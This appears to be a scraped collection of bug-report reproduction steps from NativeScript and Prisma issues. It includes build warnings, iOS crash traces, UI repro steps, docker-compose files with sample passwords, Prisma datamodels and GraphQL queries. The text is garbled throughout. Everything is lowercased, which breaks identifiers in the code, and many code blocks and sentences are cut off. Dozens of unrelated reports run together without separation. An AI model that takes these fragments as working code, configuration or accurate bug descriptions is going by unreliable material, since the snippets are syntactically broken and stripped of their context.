"export \'eventdata\' was not found in \'../../../data/observable\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view-base/view-base.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.common.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts @ /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js warning in /users/mdonev/github/nativescript/tns-core-modules/ui/core/bindable/bindable.ts 10:0-173
"export \'propertychangedata\' was not found in \'../../../data/observable\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view-base/view-base.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.common.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts @ /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js warning in /users/mdonev/github/nativescript/tns-core-modules/ui/core/view-base/view-base.ts 12:0-43
"export \'isandroid\' was not found in \'../../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.common.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts @ /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js warning in /users/mdonev/github/nativescript/tns-core-modules/ui/core/view-base/view-base.ts 559:12-21
"export \'isandroid\' was not found in \'../../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.common.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts @ /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js warning in /users/mdonev/github/nativescript/tns-core-modules/ui/core/view-base/view-base.ts 650:12-21
"export \'isandroid\' was not found in \'../../../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/core/view/view-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.common.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts @ /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js warning in /users/mdonev/github/nativescript/tns-core-modules/utils/debug.ts 63:22-31
"export \'isandroid\' was not found in \'../platform\' @ /users/mdonev/github/nativescript/tns-core-modules/ui/builder/builder.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame-common.ts @ /users/mdonev/github/nativescript/tns-core-modules/ui/frame/frame.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.common.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/devtools-elements.ts @ /users/mdonev/github/nativescript/tns-core-modules/debugger/webinspector-dom.ts @ /users/mdonev/github/nativescript/tns-core-modules/inspector_modules.js
webpack compilation complete
watching for file changes.
webpack build done!
copying template files...
platform ios successfully added
preparing project...
project successfully prepared (ios)
building project...
xcode build...
project successfully built.
installing on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f...
successfully installed on device with identifier '3795f3eb-2a4f-4e09-9a71-09157d0a5f1f'.
successfully transferred bundle.js on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f.
successfully transferred package.json on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f.
successfully transferred runtime.js on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f.
successfully transferred starter.js on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f.
successfully transferred tns_modules on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f.
successfully transferred tns-core-modules on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f.
successfully transferred inspector_modules.js on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f.
successfully transferred vendor.js on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f.
restarting application on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f...
successfully synced application org.nativescript.devtest on device 3795f3eb-2a4f-4e09-9a71-09157d0a5f1f.
console info hmr: hot module replacement enabled
waiting for signal.
***** fatal javascript exception - application has been terminated
native stack trace:
1 nativescript::reportfatalerrorbeforeshutdown(jsc::execstate*, jsc::exception*, bool)
2 nativescript::fficallback<nativescript::objcmethodcallback>::fficlosurecallback(ffi_cif*, void*, void**, void*)
3 ffi_closure_unix64_inner
4 ffi_closure_unix64
5 _cfxregistrationpost
6 ___cfxnotificationpost_block_invoke
7 -[_cfxnotificationregistrar find:object:observer:enumerator:]
8 _cfxnotificationpost
9 -[nsnotificationcenter postnotificationname:object:userinfo:]
10 -[uiapplication _callinitializationdelegatesformainscene:transitioncontext:]
11 -[uiapplication _runwithmainscene:transitioncontext:completion:]
12 __111-[__uicanvaslifecyclemonitor_compatability _schedulefirstcommitforscene:transition:firstactivation:completion:]_block_invoke
13 +[_uicanvas _enqueuepostsettingupdatetransactionblock:]
14 -[__uicanvaslifecyclemonitor_compatability _schedulefirstcommitforscene:transition:firstactivation:completion:]
15 -[__uicanvaslifecyclemonitor_compatability activateeventsonly:withcontext:completion:]
16 __82-[_uiapplicationcanvas _transitionlifecyclestatewithtransitioncontext:completion:]_block_invoke
17 -[_uiapplicationcanvas _transitionlifecyclestatewithtransitioncontext:completion:]
18 __125-[_uicanvaslifecyclesettingsdiffaction performactionsforcanvas:withupdatedscene:settingsdiff:fromsettings:transitioncontext:]_block_invoke
19 _performactionswithdelayfortransitioncontext
20 -[_uicanvaslifecyclesettingsdiffaction performactionsforcanvas:withupdatedscene:settingsdiff:fromsettings:transitioncontext:]
21 -[_uicanvas scene:didupdatewithdiff:transitioncontext:completion:]
22 -[uiapplication workspace:didcreatescene:withtransitioncontext:completion:]
23 -[uiapplicationsceneclientagent scene:didinitializewithevent:completion:]
24 -[fbssceneimpl _didcreatewithtransitioncontext:completion:]
25 __56-[fbsworkspace client:handlecreatescene:withcompletion:]_block_invoke_2
26 __40-[fbsworkspace _performdelegatecallout:]_block_invoke
27 _dispatch_client_callout
28 _dispatch_block_invoke_direct
29 __fbsserialqueue_is_calling_out_to_a_block__
30 -[fbsserialqueue _performnext]
31 -[fbsserialqueue _performnextfromrunloopsource]
javascript stack trace:
1 @
2 @
3 parse@
4 parse@
5 parse@
6 parseinternal@
7 loadinternal@
8 loadpage@
9 createrootview@
10 setwindowcontent@
11 notifyappstarted@
12 didfinishlaunchingwithoptions@
13 @[native code]
14 onreceive@
15 uiapplicationmain@[native code]
16 _start@
17 run@
18 @
19 ./app.ts@
20 __webpack_require__@
21 checkdeferredmodules@
22 webpackjsonpcallback@
23 anonymous@
24 evaluat< >
javascript error:
js error error: parsing xml at 1:1
> parsing xml at 1:1
> module 'ui/page' not found for element 'page'.
> invalid color: white
goto and preview the app
status bar should be red.
press "go to page 2" button
page should change and status bar should become green.
press "go back using nsrouterlink"
page should change to "page 1" and the status bar should become red (that\'s how it should be).
press "go to page 2" and after navigating to "page 2" tap "go back to page 1 using `router.backtopreviouspage()`"
page should change to "page 1", but the color of the status bar will still be green instead of red.
try the provided playground app on ios and open a modal and close it
you will see that the red area disappears
but this doesn't happen on android.
.btn { margin: 0;
``` layout: ```
<stacklayout class="home-panel"> <button class="btn btn-primary" text="button"></button> <button class="btn btn-primary m-t-5 m-0" text="m-t-5 & m-0"></button> </stacklayout>
``` ![css-bug](
apply this style to a segmentedbar:
segmentedbar { color: #fc7e0e; selected-background-color: #fc7e0e;
then call alert().
<button text="tap" height="80" width="200" style="android-elevation: 0;" />
no shadow on tap (unless android-dynamic-elevation-offset is set as well).
enter some text into the textfield then hit the space bar twice in order to trigger the shortcut and have a period inserted
you will notice that the period is not present in the label below the textfield
`tns create mytestapp --template tns-template-master-detail-ng`
start ios simulator with version < 11
`tns run ios --bundle`
the app is successfully started
try to scroll the application
an exception is thrown
***** fatal javascript exception - application has been terminated
native stack trace:
1 nativescript::reportfatalerrorbeforeshutdown(jsc::execstate*, jsc::exception*, bool)
2 nativescript::fficallback<nativescript::objcmethodcallback>::fficlosurecallback(ffi_cif*, void*, void**, void*)
3 ffi_closure_unix64_inner
4 ffi_closure_unix64
5 -[uiscrollview(uiscrollviewinternal) _scrollviewwillbegindragging]
6 -[uiscrollview _updatepangesture]
7 -[uigesturerecognizertarget _sendactionwithgesturerecognizer:]
8 _uigesturerecognizersendtargetactions
9 _uigesturerecognizersendactions
10 -[uigesturerecognizer _updategesturewithevent:buttonevent:]
11 _uigestureenvironmentupdate
12 -[uigestureenvironment _deliverevent:togesturerecognizers:usingblock:]
13 -[uigestureenvironment _updategesturesforevent:window:]
14 -[uiwindow sendevent:]
15 -[uiapplication sendevent:]
16 __dispatchpreprocessedeventfromeventqueue
17 __handleeventqueue
18 __cfrunloop_is_calling_out_to_a_source0_perform_function__
19 __cfrunloopdosources0
20 __cfrunlooprun
21 cfrunlooprunspecific
22 gseventrunmodal
23 uiapplicationmain
24 ffi_call_unix64
javascript stack trace:
1 getscrolloffset@
2 listviewscrollviewwillbegindragging@
3 uiapplicationmain@[native code]
4 _start@
5 run@
6 bootstrapnativescriptapp@
7 bootstrapapp@
8 bootstrapmodule@
9 ./main.ts@
10 __webpack_require__@
11 checkdeferredmodules@
12 webpackjsonpcallback@
13 anonymous@
14 evaluate@[native code]
15 moduleevaluation@[native code]
16 promisereactionjob@[native code]
17 require@[native code]
18 anonymous@
19 evaluate@[native code]
20 moduleevaluation@[native code]
21 promisereactionjob@[native code]
javascript error:
js error typeerror: undefined is not an object (evaluating 'this.nativeviewprotected.safeareainsets.top')
use [this playground](
tap the "css toggle" and "js toggle" buttons.
for now we only have the crash logs from google analytics.
the above screenshots come from the example playground: - open the app;
- tap the text field;
run the pg demo.
add a `textfield`:
<textfield (tap)="ontap($event)" isuserinteractionenabled="false"></textfield>
and tap handler:
``` ontap(args) { console.log('ontap:' + args.object); }
observe that `tap` is fired on android, also the textfield blinks and gets underlined indicating for the interaction.
<label text="this is kind-of-magic - or a bug?" style="text-transform: capitalize"></label>
this produces - on ios: `this is kind-of-magic - or a bug?`
- on android: `this is kind-of-magic - or a bug`?
use the same steps described in the gif
create a flexboxlayout that contains a row with two label elements, the first with flexgrow=1, the second one with flexshrink=0
give the first a very long content, so that is has to be truncated.
please check the home component of how its set-up
once build, just start it up and scroll all the way down in the scrollview, you will see that the scrollview falls behind the tabbar
please do test it on different devices (with and without safearea's) and different ios versions.
refer to the nativescript playground demo linked below.
run following playground example:
apply the following styles on any ns layout
`border-radius: 50%;`
`border-color: #dcdcdc transparent #dcdcdc transparent;`
start a phone call, open a nativescript app with a tabview
run [this playground]( on ios
tap on any of the fields
keyboard doesn't show (as expected)
minimise the app and then get back to it
don't wait for it to fully load, tap quickly on some of the fields
you can now change the text.
i was running the emulator (using a webpack bundle), focusing on ipad
so i ran: `$ tns run ios --device "ipad pro (12.9-inch) (2nd generation)" --bundle --env.development --env.uglify --env.aot ` the emulator ran for about a day and a half (ie, 36 hrs+) before the behavior began
the computer was asleep periodically during the time, but the emulator was not closed
_copied from original issue: nativescript/nativescript-cli#4340_ <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
just run the sample project
* load up app
* scroll to the bottom
* scroll to the top and observe text and container overlapping
<listview background="linear-gradient(to bottom, #2a2055, #068ec0)" for="x in xarray" @itemtap="confirm" > <v-template> </v-template>
</listview>
make sure the `transition` property in main-view-model.ts is enabled
press the icon to navigate to new page and then navigate back
try to press the icon again - page should be frozen.
<flexboxlayout style="width: 200; background-color: red;"> <label text="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" flexshrink="1" style="background-color: blue;"></label> <label text="bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb" flexshrink="1" style="background-color: green;"></label> <label text="cccccccccccccccccccccccccccccccccccccccccccccccccc" flexshrink="1" style="background-color: yellow;"></label>
</flexboxlayout>
install clean project, wrap frame in app-root.xml with grid-layout and try to run this script
var frame = require("tns-core-modules/ui/frame");
var navigationbar = frame.topmost().ios.controller.navigationbar;
navigationbar.barstyle = 1;
this is what it looks like on our moto x play:
![ezgif-4-d90e44ff0f6b](
i created an angular project and tested it using a genymotion emulator with android 8.0
tap "navigate to some page" -- notice how the "players" part of the page disappears immediately instead of transitioning away with the rest of the view.
add nested tap events to the objects, a label with a tap inside a stacklayout with another tap is enough, the stacklayout event will be fired even when the touch is on the label
<scrollview tap="test"> <stacklayout tap="test"> <label text="touch this label" tap="test" textwrap="true"/> </stacklayout>
</scrollview>
export function test(args: eventdata) { (<any>args.object).ispassthroughparentenabled = false; // this seems to be ignored console.log("touch on " + args.object);
home.html: <flexboxlayout> <stacklayout #container orientation="vertical" (loaded)="onloaded()"> <label text="test"></label> </stacklayout>
</flexboxlayout> home.css: flexboxlayout { justify-content: center; align-items: center; background-color: aquamarine;
stacklayout { width: 300; padding: 20 20; background-color: bisque; border-radius: 8;
} home.ts: ...
export class homecomponent { @viewchild("container") container: elementref; onloaded() { let container = <view>this.container.nativeelement; container.scalex = 0; container.scaley = 0; container.animate({ scale: { x: 1, y: 1 }, duration: 1000, curve: animationcurve.easein }); } } ....
add a `background-image` with a `background-size` and `background-position`
test in android.
see
open the attached app
run `tns debug android/ios` 3
navigate to detail page in the listview
go back to home page
repeating steps 3,4 several times shows that the two labels in the actionbar are multiplied
here is what i am doing: ```
httpmodule.request({ url: " ", timeout: 5000, method: "get", headers: { }
}).then((response) => { const result = response.content.tojson(); alert("received response: " + response.content); }, (e) => {
the provided url leads to a sample webservice from [ and the delay is set to 10 seconds
open the provided sample app and tap the button.
it will start the http request and after about 10 seconds, you get an alert with the json response.
see the playground example below on android.
create a listview with an item and add a basic itemtap, add a tap action over a parent element and try in the tap action to dismisssoftkeyboard on android.
deploy prisma `1.34.7` (sample compose file):
version: '3'
services: prisma: image: prismagraphql/prisma:1.34.7 restart: always ports: - "4466:4466" environment: prisma_config: | port: 4466 databases: default: connector: mysql host: mysql port: 3306 user: root password: prisma migrations: true mysql: image: mysql:5.7 restart: always ports: - "3306:3306" environment: mysql_root_password: prisma volumes: - data-mysql:/var/lib/mysql volumes: data-mysql: driver: local
deploy a service with a `secret`, sample `prisma.yml`:
endpoint:
secret: devsecret
datamodel: - datamodel.prisma
run `prisma token`
explore the prisma admin interface with this token or perform queries in the playground, which will return `your token is invalid
it might have expired or you might be using a token from a different project.` reverting back to < `1.34.7` (e.g
`1.34.6`) work fine.
define type with name model
type model {
generate types
$ prisma generate
i have this in my datamodel generated with prisma 1.34.5 ````
type bookingl2bcost { id: int! @id(strategy: sequence) @sequence(name: "bookingl2bcost_id_seq", initialvalue: 1, allocationsize: 1) amount: float! contract: contract @relation(link: inline) createdat: datetime! @createdat item: item @relation(link: inline) maxbookings: int maxl2b: int minbookings: int minl2b: int updatedat: datetime! @updatedat
```` and in my table i have this check constraint to avoid an insert with both relations empty, you have to insert one or other
alter table billing."bookingl2bcost" add constraint chk_item_contract check ((((contract is null) and (item is not null)) or ((contract is not null) and (item is null))));
```` and i try to run the create mutation.
mutation testcreate($data: bookingl2bcostcreateinput!) { billing { createbookingl2bcost(data: $data) { id createdat } }
variables ````
{ "data": { "minl2b": 1, "maxl2b": 2, "maxbookings": 2, "minbookings": 1, "amount": 5, "contract": { "connect": { "id": 75 } }
```` but i get this error ````
error: new row for relation "bookingl2bcost" violates check constraint "chk_item_contract"
```` but i'm sending the contract id fk (valid) in the variables
if i remove the check constraint, from the database, it works
{ "data": { "billing": { "createbookingl2bcost": { "id": 14, "createdat": "2019-08-21t11:08:47.972z" } } }
```` can't we have any constraint?
clone `git clone git@github.com:prisma/prisma-examples.git`
`cd prisma-examples/node/docker-postgres && npm i`
`docker-compose up -d`
`prisma deploy`
setup both types as indicated above
build a resolver that tries to make use of either: `updatemany`, `update`, or `upsert/update` in order to update several elements from a list (above: a list of two assets).
subscribe data with graphql alias:
subscription { example: user { mutation node { id name state } previousvalues { id name state } }
trigger mutation:
mutation { createuser( data: { name: "john doe" state: busy } ) { id }
exception `java.util.nosuchelementexception: jserror.get` thrown at prisma server
no subscription update.
npx prisma login
npx prisma init
npm i -g prisma
npx prisma deploy
prisma deploy
this bug has three scenarios described on
> code that reproduce this bug is available there >
have any schema
update schema using generated prisma-client
await `.count()` on update function to retrieve number of updated rows 4
`.count()` returns a number but type definitions say its a string
use the following `docker-compose.yaml` ```yaml
version: '3'
services: db: image: mysql:5.7 command: \'--default-authentication-plugin=mysql_native_password\' restart: always ports: - \'3306:3306\' environment: mysql_database: \'foo\' mysql_user: \'admin\' mysql_password: \'test\' mysql_root_password: \'root\' prisma: image: prismagraphql/prisma:1.34.3 restart: always ports: - "4466:4466" environment: prisma_config: | port: 4466 # uncomment the next line and provide the env var prisma_management_api_secret=my-secret to activate cluster security # managementapisecret: my-secret databases: default: connector: mysql host: db database: foo user: root password: root rawaccess: true port: \'3306\' migrations: false
run `npm i prisma`.
type hoge @db(name: "hoge") { id: id! @id name: string! foo: fuga bar: fuga
} type fuga @embedded { value: int! time: datetime! @createdat
and `prisma deploy`
then will get ```
hoge the relation field `foo` must specify a `@relation` directive: `@relation(name: "myrelation")` the relation field `bar` must specify a `@relation` directive: `@relation(name: "myrelation")`
reduce the `queuesize` available in [1.32.1]( and [1.30.3](
the reproduction is in `1.29.2`, so, a high concurrency can be used to reproduce this issue there.
const query = `select u.name, count(t.id) as total, sum(t.end - t.start) as avg_time from database$dev."user" u left outer join database$dev."_usertasks" ut on ut."b" = u.id left outer join database$dev."task" t on (ut."a" = t.id ) where u.role = \'technician\' and t.date between \'2018-01-30\' and \'2019-12-31\' group by u.name;` const queryresult = await ctx.db.mutation.executeraw({ query });
i can give access to prisma server if is needed
1.my client full query is
> query usersconnection($where: userwhereinput) { usersconnection(where: $where) { edges { cursor } }
} 2.print the client real query string:
> query usersconnection($where: userwhereinput) { usersconnection(where: $where) { edges pageinfo }
} then the server response: error: field 'edges' of type 'useredge' must have a sub selection
follow all steps on migration outlined in prisma's video here:
once you have performed prisma introspect and the new .prisma file is generated, you will find that new data types will be created for the relational tables that were created from the scalar [string] arrays or [int] arrays in the 1.0 data model
the properties of the scalar arrays are then omitted from their original type definitions
for example, `type post { keywords: [string] }`, the "keywords" prop is missing in the new .prisma type definition for post.
deploy the following datamodel with prisma deploy
enum test { admin user
} type user { id: id! @id name: test!
deploy the same datamodel again with `--no-migrate` flag **expected behaviour**
prisma should be able to deploy enum type if underlying type is a string.
1.set up a prisma project with a self hosted database on heroku using heroku postgres hobby plan
2.lift your docker image locally and try to deploy locally by doing `prisma deploy`
3.make any request using `prisma-binding` or using `playground` ```
[graphql error]: message: whoops
looks like an internal server error
search your server logs for request id: local:cjxkrhm3001090692c8z0r5kl, location: [object object], path: users
[network error]: error: whoops
looks like an internal server error
search your server logs for request id: local:cjxkrhm3001090692c8z0r5kl
looks like an internal server error
search your server logs for request id: local:cjxkrhm3001090692c8z0r5kl
latest error in docker logs
org.postgresql.util.psqlexception: the connection attempt failed
at org.postgresql.core.v3.connectionfactoryimpl.openconnectionimpl(connectionfactoryimpl.java:257) at org.postgresql.core.connectionfactory.openconnection(connectionfactory.java:49) at org.postgresql.jdbc.pgconnection.<init>(pgconnection.java:195) at org.postgresql.driver.makeconnection(driver.java:452) at org.postgresql.driver.connect(driver.java:254) at slick.jdbc.driverdatasource.getconnection(driverdatasource.scala:101) at slick.jdbc.datasourcejdbcdatasource.createconnection(jdbcdatasource.scala:71) at slick.jdbc.jdbcbackend$basesession.<init>(jdbcbackend.scala:453) at slick.jdbc.jdbcbackend$databasedef.createsession(jdbcbackend.scala:46) at slick.jdbc.jdbcbackend$databasedef.createsession(jdbcbackend.scala:37) at slick.basic.basicbackend$databasedef.acquiresession(basicbackend.scala:249) at slick.basic.basicbackend$databasedef.acquiresession$(basicbackend.scala:248) at slick.jdbc.jdbcbackend$databasedef.acquiresession(jdbcbackend.scala:37) at slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:274) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748)
caused by: java.net.unknownhostexception: ec2-54-228-246-214.eu-west-1.compute.amazonaws.com at java.net.abstractplainsocketimpl.connect(abstractplainsocketimpl.java:184) at java.net.sockssocketimpl.connect(sockssocketimpl.java:392) at java.net.socket.connect(socket.java:589) at org.postgresql.core.pgstream.<init>(pgstream.java:69) at org.postgresql.core.v3.connectionfactoryimpl.openconnectionimpl(connectionfactoryimpl.java:156) ..
mutation { updatemanyfunnelthemes( data: { secondarylogo: { connect: { id: "5ce3b3e42ab79c0007442580" } } } ) { count }
``` **resulting behavior**
argument \'data\' expected type \'funnelthemeupdatemanymutationinput!\' but got: {secondarylogo: {connect: {id: \\"5ce3b3e42ab79c0007442580\\"}}}
reason: 'secondarylogo' field 'secondarylogo' is not defined in the input type 'funnelthemeupdatemanymutationinput'.
updatemanyfunnelthemes(data: {secondarylogo: {connect: {id: \\"5ce3b3e42ab79c0007442580\\"}}}) { ^
create datamodel
`type user {`
` id: id! @id`
` last_name: string` ` createdat: datetime! @createdat`
` updatedat: datetime! @updatedat`
create seeder.
`prisma deploy` it
get seeded model with unique field
inspect value: it will contains nil fields
unfortunately, the database is private and hence i am not able to share the seed data.
use this datamodel and deploy using prisma deploy : ```graphql
type bris @db(name: "bris") { id_bris: id! @id date: datetime! idetat: etat! @db(name: "id_etat") @relation(name: "brisetatrelation") idmateriel: materiel! @db(name: "id_materiel") @relation(name: "brismaterielrelation")
} type cle @db(name: "cle") @relationtable { id_cle: id! @id idlocalisation: localisation! @db(name: "id_localisation") @relation(name: "clelocalisationrelation") iduser: user! @db(name: "id_user") @relation(name: "cleuserrelation")
} type emprunt @db(name: "emprunt") { id_emprunt: id! @id date: datetime! idmaterielemp: string! @db(name: "id_materiel_emp") iduseremprunt: string! @db(name: "id_user_emprunt") qte: int! @default(value: 0)
} type etat @db(name: "etat") { id_etat: id! @id bris: [bris] @relation(name: "brisetatrelation") label: string @default(value: "null")
} type localisation @db(name: "localisation") { id_localisation: id! @id cle: [cle] @relation(name: "clelocalisationrelation") label: string @default(value: "null") materiel: [materiel] @relation(name: "localisationmaterielrelation")
} type materiel @db(name: "materiel") { id_materiel: id! @id bris: [bris] @relation(name: "brismaterielrelation") codemateriel: string! @db(name: "code_materiel") description: string @default(value: "\'-\'") idlocalisationmateriel: localisation! @db(name: "id_localisation_materiel") @relation(name: "localisationmaterielrelation") idtype: type! @db(name: "id_type") @relation(name: "materieltyperelation") label: string! lienachat: string! @db(name: "lien_achat") @default(value: "\'-\'") qteinitiale: int! @db(name: "qte_initiale") @default(value: 0) recommander: int! @default(value: 0) sku: string! @default(value: "\'0\'")
} type privilege @db(name: "privilege") { id_privilege: id! @id label: string @default(value: "\'-\'") user: [user] @relation(name: "privilegeuserrelation")
} type projet @db(name: "projet") { id_projet: id! @id datedebut: datetime @db(name: "date_debut") datefin: datetime @db(name: "date_fin") userprojet: [userprojet] @relation(name: "projetuserprojetrelation")
} type reservation @db(name: "reservation") { id_reservation: id! @id idmateriel: string! @db(name: "id_materiel") idsource: userprojet! @db(name: "id_source") @relation(name: "reservationuserprojetrelation") qte: int @default(value: 0)
} type type @db(name: "type") { id_type: id! @id label: string @default(value: "null") materiel: [materiel] @relation(name: "materieltyperelation")
} type user @db(name: "user") { id_user: id! @id cle: [cle] @relation(name: "cleuserrelation") cpuser: string! @db(name: "cp_user") idprivilegeuser: privilege! @db(name: "id_privilege_user") @relation(name: "privilegeuserrelation") mail: string! nom: string! prenom: string! userprojet: [userprojet] @relation(name: "useruserprojetrelation")
} type userprojet @db(name: "user_projet") { id_userprojet: id! @id idprojet: projet! @db(name: "id_projet") @relation(name: "projetuserprojetrelation") iduser: user! @db(name: "id_user") @relation(name: "useruserprojetrelation") reservation: [reservation] @relation(name: "reservationuserprojetrelation")
enable yarn pnp on the project by adding this to package.json:
"installconfig": { "pnp": true
instal prisma & prisma cli
add valid prisma.yml config file
run `export debug="*" && yarn prisma`
steps to reproduce(mostly) the behavior:
export a moderate size database through `prisma export`
import through `prisma import -d path`
unfortunately, i am not able to share the exact file as the data is private.
- init a new prisma repository
- have a large `datamodel.prisma` (for us it's approx
1600 lines coming to 46kb)
- run `prisma deploy`
make a following datamodel ```
type itemcategory { id: id! @id name: string! parent: itemcategory @relation(name: "itemrelation") subcategories: [itemcategory!]! @relation(name: "itemrelation")
then add some data
1 parent 1 child.
{ itemcategories { id name parent { name } subcategories{ id name } }
<img src=" " alt="scr" border="0" width="500"> basically **if i replace subcategories with anything** else it works.
create a type without `createdat` and `updatedat` in the datamodel
run `prisma deploy`
go to your api playground (not the prisma one)
make a request on that type, with `orderby: createdat_asc`
go to 'app.prisma.io' 2
click on 'upgrade cluster'
receive success message
cluster is never upgraded.
deploy this `datamodel.prisma`:
type a { id: int! @id(strategy: sequence) name: string
} type b { id: int! @id(strategy: sequence) a: a @relation(name: "b2a", link: inline)
create instance of a:
mutation { createa(data: {name: "a1"}) { id }
```javascript
{ "data": { "createa": { "id": 1 } }
create instance of b, connecting instance of a:
mutation { createb(data: { a: { connect: { id: 1 } } }) { id }
```javascript
{ "data": null, "errors": [ { "message": "whoops
looks like an internal server error
search your server logs for request id: local:cjw5fgf72006207384xyfzquj", "path": [ "createb" ], "locations": [ { "line": 2, "column": 3 } ], "requestid": "local:cjw5fgf72006207384xyfzquj" } ]
deploy prisma using the standard configuration and then view the log, shown below
[info] initializing workers...
[info] obtaining exclusive agent lock...
[info] successfully started 1 workers.
[info] obtaining exclusive agent lock..
successful.
[info] deployment worker initialization complete.
server running on :53851
[telemetry] warning: telemetry call failed with javax.net.ssl.sslhandshakeexception: general sslengine problem
[telemetry] warning: telemetry call failed with javax.net.ssl.sslhandshakeexception: general sslengine problem
[telemetry] warning: telemetry call failed with javax.net.ssl.sslhandshakeexception: general sslengine problem
[telemetry] warning: telemetry call failed with javax.net.ssl.sslhandshakeexception: general sslengine problem
[telemetry] warning: telemetry call failed with javax.net.ssl.sslhandshakeexception: general sslengine problem
[telemetry] warning: telemetry call failed with javax.net.ssl.sslhandshakeexception: general sslengine problem
`prisma init hello-world`
add configuration to connect to db
select existing data
choose typescript or javascript as programming language
outputs the error, but does generate files
# prisma.yml endpoint: xxx
secret: xxx
datamodel: - ./test1.prisma generate: - generator: typescript-client output: xxx - generator: graphql-schema output: xxx
# test1.prisma type game { gameid: id! @id createdat: datetime! @createdat updatedat: datetime! @updatedat lastupdatedon: string! players: [player!]! @relation(link: table, name: "gameplayer")
} type player { playerid: id! @id createdat: datetime! @createdat updatedat: datetime! @updatedat lastupdatedon: string! games: [game!]! @relation(name: "gameplayer")
``` `prisma deploy`
in a new directory install `prisma` and `prisma-client-lib`
run `prisma introspect` or `npx prisma introspect` and select the option of using a `mysql` database with data on it.
select typescript client
when the introspect step finishes run `prisma deploy` or `npx prisma deploy` and you will see this:
![screen shot 2019-05-20 at 8 29 12 am]( 5
visit and notice that the schema is not being updated with the entities in the database.
generated client in this repo via 1.26.6 and latest doesn't compile at `subscriptionpromise`, `subscriptionsubscription` type(s) missing.
install version 1.33 of prisma
run prisma init and follow the cli guide.
use windows 10 x64 and install node.js 12.2.0 or 10.15.3
use the command line to install the npm package prisma v1.33.0
import the attached mysql schema in a mysql 5.7 server
run prisma init in the command line
- select use existing database
- select mysql
- select yes for "does your database contain existing data?"
- enter your mysql credentials - ex: localhost, port 3306, user, password
- select the mysql database/schema that you've imported for introspection
- wait a bit and it will give you the "typeerror: cannot read property \'type\' of undefined"
create a top level folder:
mutation { createfolder(data: { name: "top level" }) { id }
create a sub-folder with the previously created folder as the parent
mutation { createfolder(data: { name: "bottom level", parent: { connect: { id: "cjvkag5n3006d0753eymur5pr" } } }) { id }
run the following query using id of the parent of subfolder
query { folders(where: { parent: { id: "cjvkag5n3006d0753eymur5pr" } }) { id name }
prisma returns an empty array instead of the folder:
{ "data": { "folders": [] }
introspect any postgres instance that has many to many relationships
example:
deploy a field such as: `number: int! @id(strategy: sequence)` excluding the decorator
deploys w/o error.
create a prisma server with the above schema
seed with test data
execute the query written above.
go through process for setting up prisma w/ existing db
try and add data via playground
have a large database on aurora mysql (but i suspect this is not specific to this)
since the database is large and needs thousands of queries to export, chances are that one of these queries will time out, breaking the entire export.
create a model with 2 unique fields (i.e
email and username)
insert a node where `email = test@test.com` and `username = user1`
query the single node with parameters `email = test@test.com` and `username = user2`
